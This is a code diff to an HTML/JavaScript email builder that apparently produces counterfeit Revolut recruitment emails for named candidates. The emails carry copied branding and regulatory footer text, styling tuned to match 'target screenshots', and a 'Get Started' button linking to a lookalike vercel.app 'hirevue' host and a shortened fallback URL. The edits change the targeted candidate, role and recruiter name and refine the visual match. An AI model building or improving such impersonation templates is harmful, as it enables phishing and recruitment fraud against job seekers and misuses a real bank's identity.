@@ -106,7 +106,7 @@
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
               <div class="form-group">
                 <label for="candName">Candidate Full Name</label>
-                <input type="text" id="candName" placeholder="e.g. ADIBA SAYYED or MAHIMA GURJAR" value="ADIBA SAYYED" oninput="updateEmailPreview()" />
+                <input type="text" id="candName" placeholder="e.g. SAYYED ADIL or MAHIMA GURJAR" value="SAYYED ADIL" oninput="updateEmailPreview()" />
               </div>
               <div class="form-group">
                 <label for="candEmail">Candidate Email Address</label>
@@ -117,11 +117,11 @@
             <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px;">
               <div class="form-group">
                 <label for="jobTitle">Position / Role Title</label>
-                <input type="text" id="jobTitle" value="Phone Support Specialist (Retail)" oninput="updateEmailPreview()" />
+                <input type="text" id="jobTitle" value="FinCrime Analyst (Investigator)" oninput="updateEmailPreview()" />
               </div>
               <div class="form-group">
                 <label for="recruiterName">Recruiter Name</label>
-                <input type="text" id="recruiterName" placeholder="e.g. Patrycja Bunalska" value="" oninput="updateEmailPreview()" />
+                <input type="text" id="recruiterName" placeholder="e.g. Patrycja Bunalska" value="Patrycja Bunalska" oninput="updateEmailPreview()" />
               </div>
               <div class="form-group">
                 <label for="recruiterEmail">Recruiter Email (For Signature)</label>
@@ -202,33 +202,33 @@
         }
 
         function updateEmailPreview() {
-          const rawName = document.getElementById('candName').value.trim() || 'ADIBA SAYYED';
+          const rawName = document.getElementById('candName').value.trim() || 'SAYYED ADIL';
           const formattedName = rawName.toUpperCase();
-          const role = document.getElementById('jobTitle').value.trim() || 'Phone Support Specialist (Retail)';
-          const recruiter = document.getElementById('recruiterName').value.trim();
+          const role = document.getElementById('jobTitle').value.trim() || 'FinCrime Analyst (Investigator)';
+          const recruiter = document.getElementById('recruiterName').value.trim() || 'Patrycja Bunalska';
           const recruiterEmail = document.getElementById('recruiterEmail').value.trim();
           const url = document.getElementById('candidateLink').value.trim() || 'https://revolut-hirevue-app-eu.vercel.app';
           const fallbackUrl = document.getElementById('fallbackTextUrl').value.trim() || 'https://seu.hvue.io/1h7GOqkWVpvg7jtm';
 
           const card = document.getElementById('emailHTMLCard');
 
-          // 100% Bulletproof Revolut Logo Table Header (Matching Target Screenshot 3.37.46 PM.jpeg)
+          // 100% Bulletproof Revolut Logo Table Header (Matching Target Screenshot 3.46.32 PM.jpeg)
           const logoHeader = `
-            <div class="email-logo" style="text-align: center; margin-bottom: 20px;">
+            <div class="email-logo" style="text-align: center; margin-bottom: 24px;">
               <a href="${REVOLUT_LOGO_CLICK_URL}" target="_blank" style="text-decoration: none;">
-                <span style="font-family: 'Inter', system-ui, sans-serif; font-size: 26px; font-weight: 900; color: #000000; letter-spacing: -0.04em;
+                <span style="font-family: 'Inter', system-ui, sans-serif; font-size: 28px; font-weight: 900; color: #000000; letter-spacing: -0.04em;
   display: inline-block;">Revolut</span>
               </a>
             </div>
           `;
 
-          // Bulletproof Solid Blue Table Button CENTERED for Email 2
+          // Bulletproof Solid Blue Table Button CENTERED for Email 2 (Matching Target Screenshot 3.46.32 PM (1).jpeg)
           const blueButtonCenteredHtml = `
             <table border="0" cellspacing="0" cellpadding="0" align="center" style="margin: 28px auto; text-align: center;">
               <tr>
                 <td align="center" bgcolor="#0044FF" style="background-color: #0044FF; border-radius: 6px;">
-                  <a href="${url}" target="_blank" style="font-family: 'Inter', system-ui, sans-serif; font-size: 15px; font-weight: 700; color: #ffffff
-  !important; text-decoration: none; padding: 14px 36px; border: 1px solid #0044FF; border-radius: 6px; display: inline-block; background-color: #0044FF;
+                  <a href="${url}" target="_blank" style="font-family: 'Inter', system-ui, sans-serif; font-size: 16px; font-weight: 700; color: #ffffff
+  !important; text-decoration: none; padding: 14px 38px; border: 1px solid #0044FF; border-radius: 6px; display: inline-block; background-color: #0044FF;
   ">
                     Get Started
                   </a>
@@ -271,4 +271,4 @@
   United Kingdom</a>. Main Office: 4th Floor, The Columbus Building, <a href="${SECOND_ADDR_MAP_URL}" target="_blank" class="footer-address-link">7
   Westferry Circus, London, E14 4HD, United Kingdom</a>. Revolut Ltd is authorised and regulated by the Financial Conduct Authority under the Electronic
   Money Regulations 2011, Firm Reference 900562. Revolut Ltd is an Appointed Representative of Lending Works Ltd (for the activity of “operating an
-  electronic system for lending” only) and Thornbridge Investment
+  electronic system for lending” only)
